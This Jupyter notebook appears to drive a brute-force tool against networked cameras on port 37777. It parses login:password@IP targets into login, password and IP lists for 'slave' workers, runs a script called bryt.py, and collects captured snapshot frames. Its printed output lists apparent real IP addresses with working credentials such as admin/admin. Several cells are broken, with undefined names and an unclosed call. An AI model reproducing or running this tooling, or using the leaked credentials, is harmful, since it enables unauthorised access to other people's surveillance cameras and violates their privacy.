{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 55,
   "metadata": {},
   "outputs": [],
   "source": [
    "import os\n",
    "import time\n",
    "import shutil\n",
    "import distutils.dir_util \n",
    "import subprocess\n",
    "import operator\n",
    "\n",
    "from subprocess import Popen, call"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 56,
   "metadata": {},
   "outputs": [],
   "source": [
    "def get_params_from_file():\n",
    "    parameters = [] \n",
    "    with open('targets.txt', 'r') as f:\n",
    "        for line in f.readlines():\n",
    "            line = line.replace('@',':')\n",
    "            line = line.replace(':37777','')\n",
    "            parameters.append(line.replace('\\n', ''))\n",
    "            \n",
    "    params = []\n",
    "    for i in parameters[0::2]:\n",
    "        params.append(i.split(':'))\n",
    "    params.sort(key=lambda x: x[1], reverse=True)\n",
    "    params = [item for sublist in params for item in sublist]\n",
    "    \n",
    "    avg = len(params) // (len(params)/3)\n",
    "    out = []\n",
    "    last = 0.0\n",
    "\n",
    "    while last < len(params):\n",
    "        out.append(params[int(last):int(last + avg)])\n",
    "        last += avg\n",
    "    \n",
    "    out = sorted(out, key=operator.itemgetter(1))\n",
    "    params = out\n",
    "    \n",
    "    return params       \n",
    "    "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 57,
   "metadata": {},
   "outputs": [],
   "source": [
    "def write_slaves_data(slave, data):    \n",
    "    with open(os.path.join(slave,'logins.txt'), 'w') as f:\n",
    "        for i in set(list(zip(*PARAMS))[0]):\n",
    "            f.write(i+'\\n')\n",
    "    with open(os.path.join(slave,'passwords.txt'), 'w') as f:\n",
    "        for i in set(list(zip(*PARAMS))[1]):\n",
    "            f.write(i+'\\n')\n",
    "    with open(os.path.join(slave,'ips.txt'), 'w') as f:\n",
    "        for i in list(zip(*PARAMS))[2]:\n",
    "            f.write(i+'\\n')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 58,
   "metadata": {},
   "outputs": [],
   "source": [
    "def create_slave_dir(name):\n",
    "    distutils.dir_util._path_created = {}\n",
    "    slave_path = os.path.join(MAIN_FOLDER,'workingUnits',name)\n",
    "    copy_tree(os.path.join(MAIN_FOLDER,'slave'), slave_path)\n",
    "    \n",
    "    return slave_path"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 59,
   "metadata": {},
   "outputs": [],
   "source": [
    "def move_results(snapshots_dir):\n",
    "    for i in os.listdir(snapshots_dir):\n",
    "        destination = (time.strftime('%X-%x-')+i).replace(':','.')\n",
    "        destination = destination.replace('/','.')      \n",
    "        shutil.move(os.path.join(snapshots_dir, i),\\\n",
    "                    os.path.join(MAIN_FOLDER,'frames', destination))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 60,
   "metadata": {},
   "outputs": [],
   "source": [
    "def executor(data):    \n",
    "    slave_dir = os.path.join(MAIN_FOLDER,'slave')\n",
    "    move_results(os.path.join(slave_dir,'snapshots'))\n",
    "    write_slaves_data(slave_dir, data)\n",
    "    \n",
    "    current_dir = os.chdir(slave_dir)\n",
    "    os.system('bryt.py')\n",
    "    current_dir = os.chdir(MAIN_FOLDER)\n",
    "    \n",
    "    #move_results(os.path.join(slave_dir,'snapshots'))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 61,
   "metadata": {},
   "outputs": [],
   "source": [
    "MAIN_FOLDER = os.getcwd()  \n",
    "PARAMS = get_params_from_file()\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 62,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[['Natali', '290312', '176.111.33.39'], ['admin', 'admin', '31.40.144.43'], ['admin', 'admin', '212.66.63.188'], ['admin', 'admin', '134.249.186.197']]\n"
     ]
    }
   ],
   "source": [
    "print(PARAMS)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 52,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'0'"
      ]
     },
     "execution_count": 52,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "executor(PARAMS)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "######     current_dir = os.chdir(MAIN_FOLDER+'//workingUnits//slave'+number)\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 64,
   "metadata": {},
   "outputs": [],
   "source": [
    "def move_errors(slaves_amount):\n",
    "    \n",
    "    slave_dir = os.path.join(MAIN_FOLDER,'slave'+str(i))\n",
    "    try:\n",
    "        with open(slave_dir+'\\\\dead_ip.txt', 'r') as f:\n",
    "            with open(MAIN_FOLDER+'\\\\error.txt', 'a') as errors:\n",
    "                for i in f.readlines():\n",
    "                    errors.write(i)\n",
    "    except FileNotFoundError:\n",
    "        pass\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "###### паралелизм: ждать конца юнита и перезапись данных\n",
    "errors?\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "def main(threads_amount=12):\n",
    "    \n",
    "    MAIN_FOLDER = os.getcwd()  \n",
    "    PARAMS = get_params_from_file()\n",
    "    THREADS = threads_amount   \n",
    "    len_params = len(PARAMS)\n",
    "    \n",
    "    for i in range(0, (len_params//THREADS)):\n",
    "        executor(PARAMS[(i*THREADS): ((i+1)*THREADS)])\n",
    "        #what time?.. var according to system?  \n",
    "        time.sleep(30)  \n",
    "    executor(PARAMS[(len_params//THREADS)*THREADS:])\n",
    "    "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "if __name__ == \"__main__\":\n",
    "    \n",
    "        main(int(sys.argv)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 63,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "[['Natali', '290312', '176.111.33.39'], ['admin', 'admin', '31.40.144.43']]"
      ]
     },
     "execution_count": 63,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "u"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.6.5"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
